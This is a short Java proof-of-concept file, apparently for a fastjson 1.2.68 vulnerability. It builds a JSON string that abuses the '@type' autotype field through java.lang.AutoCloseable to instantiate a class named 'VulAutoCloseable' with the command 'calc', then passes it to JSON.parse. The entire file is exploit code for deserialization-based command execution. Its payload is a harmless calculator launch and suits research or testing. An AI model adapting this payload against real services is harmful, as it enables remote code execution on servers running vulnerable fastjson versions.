import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class EXP_1268 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"VulAutoCloseable\",\"cmd\":\"calc\"}";
        JSON.parse(poc);
    }
}
